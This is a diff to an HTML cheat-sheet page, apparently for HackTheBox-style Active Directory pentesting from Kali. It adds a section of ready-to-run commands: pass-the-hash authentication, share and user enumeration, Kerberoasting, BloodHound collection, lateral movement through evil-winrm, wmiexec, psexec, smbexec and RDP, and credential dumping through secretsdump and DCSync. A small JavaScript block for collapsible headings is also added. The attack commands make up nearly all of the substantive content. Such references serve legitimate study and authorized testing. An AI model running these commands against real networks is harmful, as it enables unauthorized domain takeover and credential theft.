@@ -488,6 +488,7 @@ Find-DomainShare -CheckShareAccess | ForEach-Object {
                         <div class="section-header">Enumeration from Linux (Kali)</div>
                         <div class="section-content">
 
+
                                 <h2 class="sub-title">Phase 0 – Initial Scan</h2>
 
                                 <p>Full port scan</p>
@@ -516,6 +517,7 @@ nmap -sCV -p $(grep "^[0-9]" openPorts | awk '{print $1}' | cut -d'/' -f1 | past
                                 <pre><code>
 rpcclient -U "" -N &lt;IP&gt;                               
 enumdomusers
+querydispinfo
                 </code></pre>
 
                                 <h3>SMB Anonymous</h3>
@@ -662,7 +664,9 @@ crackmapexec smb &lt;IP&gt; -u user -p 'Password123!' --shares
 
                                 <p>Access SYSVOL</p>
                                 <pre><code>
-smbclient //dc1/SYSVOL -U user
+smbclient //dc1/SYSVOL -U 'domain.htb/user%password'
+smbclient //dc1/SYSVOL -U user -c "recurse ON; prompt OFF; ls"
+
                 </code></pre>
 
                                 <p>Access shares</p>
@@ -756,6 +760,227 @@ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
                                 <pre><code>
 impacket-secretsdump -just-dc-user administrator corp.com/user:Password123!@&lt;DC-IP&gt;
                 </code></pre>
+
+                        </div>
+                </div>
+
+                <div class="section">
+                        <div class="section-header">Pass-the-Hash Support</div>
+                        <div class="section-content">
+
+                                <h2 class="sub-title">Authentication Methods</h2>
+                                <pre><code>
+# Password Authentication
+-p 'Password123!'
+
+# NTLM Hash Authentication
+-H NTLM_HASH
+
+# Impacket Hash Format
+-hashes :NTLM_HASH
+
+# Full LM:NT Format
+-hashes LMHASH:NTHASH
+        </code></pre>
+
+
+                                <h2 class="sub-title">Phase 2 – With Credentials</h2>
+
+                                <p>Validate credentials</p>
+                                <pre><code>
+# Password
+crackmapexec smb &lt;IP&gt; -u user -p 'Password123!' -d corp.com
+
+# Pass-the-Hash
+crackmapexec smb &lt;IP&gt; -u user -H NTLM_HASH -d corp.com
+nxc smb &lt;IP&gt; -u user -H NTLM_HASH -d corp.com
+        </code></pre>
+
+                                <p>Password policy</p>
+                                <pre><code>
+crackmapexec smb &lt;IP&gt; -u user -p 'Password123!' --pass-pol
+        </code></pre>
+
+                                <p>Enumerate shares</p>
+                                <pre><code>
+# Password
+crackmapexec smb &lt;IP&gt; -u user -p 'Password123!' --shares
+
+# Pass-the-Hash
+crackmapexec smb &lt;IP&gt; -u user -H NTLM_HASH --shares
+        </code></pre>
+
+                                <p>Access SYSVOL</p>
+                                <pre><code>
+# Password
+smbclient //dc1/SYSVOL -U 'domain.htb/user%password'
+smbclient //dc1/SYSVOL -U user -c "recurse ON; prompt OFF; ls"
+
+# Pass-the-Hash (smbclient no soporta PtH)
+impacket-smbclient -hashes :NTLM_HASH domain/user@&lt;IP&gt;
+        </code></pre>
+
+                                <p>Access shares</p>
+                                <pre><code>
+# Password
+smbclient //&lt;IP&gt;/&lt;Share&gt; -U usuario%password
+crackmapexec smb &lt;IP&gt; -u usuario -p password --shares
+smbmap -H &lt;IP&gt; -u usuario -p password
+smbmap -H &lt;IP&gt; -u usuario -p password -r &lt;Share&gt;
+smbclient //&lt;IP&gt;/&lt;Share&gt; -U domain\\usuario%password
+
+# Pass-the-Hash
+crackmapexec smb &lt;IP&gt; -u usuario -H NTLM_HASH --shares
+nxc smb &lt;IP&gt; -u usuario -H NTLM_HASH --shares
+impacket-smbclient -hashes :NTLM_HASH domain/usuario@&lt;IP&gt;
+        </code></pre>
+
+
+                                <h3>Enumerate Domain Users</h3>
+                                <pre><code>
+# Password
+impacket-GetADUsers corp.com/user:Password123! -dc-ip &lt;IP&gt;
+
+# Pass-the-Hash
+impacket-GetADUsers -hashes :NTLM_HASH corp.com/user -dc-ip &lt;IP&gt;
+        </code></pre>
+
+                                <h3>Kerberoasting</h3>
+                                <pre><code>
+# Password
+impacket-GetUserSPNs corp.com/user:Password123! -dc-ip &lt;IP&gt; -request
+
+# Pass-the-Hash
+impacket-GetUserSPNs -hashes :NTLM_HASH corp.com/user -dc-ip &lt;IP&gt; -request
+        </code></pre>
+
+                                <h3>BloodHound from Linux</h3>
+                                <pre><code>
+# Password
+bloodhound-python -u user -p 'Password123!' \
+-d corp.com -dc dc1.corp.com -c all
+
+# Kerberos Authentication
+bloodhound-python -u user -k \
+-d corp.com -dc dc1.corp.com -c all
+        </code></pre>
+
+                                <p><strong>Note:</strong> bloodhound-python no soporta Pass-the-Hash de forma fiable.
+                                </p>
+
+
+                                <h3>Check Local Admin Access</h3>
+                                <pre><code>
+# Password
+crackmapexec smb 192.168.1.0/24 -u user -p 'Password123!' -d corp.com
+
+# Pass-the-Hash
+crackmapexec smb 192.168.1.0/24 -u user -H NTLM_HASH -d corp.com
+nxc smb 192.168.1.0/24 -u user -H NTLM_HASH -d corp.com
+        </code></pre>
+
+                                <h3>Enumerate Active Sessions</h3>
+                                <pre><code>
+# Password
+crackmapexec smb &lt;IP&gt; -u user -p 'Password123!' --sessions
+
+# Pass-the-Hash
+crackmapexec smb &lt;IP&gt; -u user -H NTLM_HASH --sessions
+        </code></pre>
+
+
+                                <h2 class="sub-title">Phase 3 – Lateral Movement</h2>
+
+                                <h3>WinRM</h3>
+                                <pre><code>
+# Password
+evil-winrm -i &lt;IP&gt; -u user -p 'Password123!'
+
+# Pass-the-Hash
+evil-winrm -i &lt;IP&gt; -u user -H NTLM_HASH
+crackmapexec winrm &lt;IP&gt; -u user -H NTLM_HASH
+nxc winrm &lt;IP&gt; -u user -H NTLM_HASH
+        </code></pre>
+
+                                <h3>WMI</h3>
+                                <pre><code>
+# Password
+impacket-wmiexec corp.com/user:Password123!@&lt;IP&gt;
+
+# Pass-the-Hash
+impacket-wmiexec -hashes :NTLM_HASH corp.com/user@&lt;IP&gt;
+        </code></pre>
+
+                                <h3>PsExec</h3>
+                                <pre><code>
+# Password
+impacket-psexec corp.com/user:Password123!@&lt;IP&gt;
+
+# Pass-the-Hash
+impacket-psexec -hashes :NTLM_HASH corp.com/user@&lt;IP&gt;
+        </code></pre>
+
+                                <h3>SMBExec</h3>
+                                <pre><code>
+# Password
+impacket-smbexec corp.com/user:Password123!@&lt;IP&gt;
+
+# Pass-the-Hash
+impacket-smbexec -hashes :NTLM_HASH corp.com/user@&lt;IP&gt;
+        </code></pre>
+
+                                <h3>RDP</h3>
+                                <pre><code>
+# Password
+xfreerdp /u:user /p:'Password123!' /v:&lt;IP&gt;
+
+# Pass-the-Hash
+xfreerdp /u:user /pth:NTLM_HASH /v:&lt;IP&gt;
+        </code></pre>
+
+
+                                <h3>Pass-the-Hash Summary</h3>
+                                <pre><code>
+# WMIExec
+impacket-wmiexec -hashes :NTLM_HASH Administrator@&lt;IP&gt;
+
+# Evil-WinRM
+evil-winrm -i &lt;IP&gt; -u user -H NTLM_HASH
+
+# CrackMapExec / NetExec
+crackmapexec winrm &lt;IP&gt; -u user -H NTLM_HASH
+crackmapexec smb &lt;IP&gt; -u user -H NTLM_HASH
+nxc smb &lt;IP&gt; -u user -H NTLM_HASH
+nxc winrm &lt;IP&gt; -u user -H NTLM_HASH
+
+# Extract NT hash from secretsdump format
+cat hashes | awk -F: '{print $4}'
+        </code></pre>
+
+
+                                <h2 class="sub-title">Phase 4 – Dumping Credentials</h2>
+
+                                <h3>secretsdump</h3>
+                                <pre><code>
+# Password
+impacket-secretsdump corp.com/user:Password123!@&lt;IP&gt;
+
+# Pass-the-Hash
+impacket-secretsdump -hashes :NTLM_HASH corp.com/user@&lt;IP&gt;
+
+# Offline dump
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+        </code></pre>
+
+                                <h3>DCSync</h3>
+                                <pre><code>
+# Password
+impacket-secretsdump -just-dc-user administrator corp.com/user:Password123!@&lt;DC-IP&gt;
+
+# Pass-the-Hash
+impacket-secretsdump -just-dc-user administrator \
+-hashes :NTLM_HASH corp.com/user@&lt;DC-IP&gt;
+        </code></pre>
 
                         </div>
                 </div>
@@ -936,6 +1161,38 @@ bloodhound
 
                         resultsContainer.classList.remove("collapsed");
                 }
+                document.querySelectorAll(".sub-title").forEach(title => {
+                        const wrapper = document.createElement("div");
+                        wrapper.classList.add("sub-wrapper");
+
+                        const content = document.createElement("div");
+                        content.classList.add("sub-content");
+
+                        // meter wrapper en el DOM justo antes del título
+                        title.parentNode.insertBefore(wrapper, title);
+
+                        // mover el título dentro del wrapper
+                        wrapper.appendChild(title);
+
+                        // mover todo hasta el siguiente sub-title o section-header
+                        let next = wrapper.nextSibling;
+
+                        while (
+                                next &&
+                                !(next.classList && (next.classList.contains("sub-title") || next.classList.contains("section-header")))
+                        ) {
+                                const temp = next.nextSibling;
+                                content.appendChild(next);
+                                next = temp;
+                        }
+
+                        wrapper.appendChild(content);
+
+                        // toggle
+                        title.addEventListener("click", () => {
+                                wrapper.classList.toggle("active");
+                        });
+                });
         </script>
 
 </body>
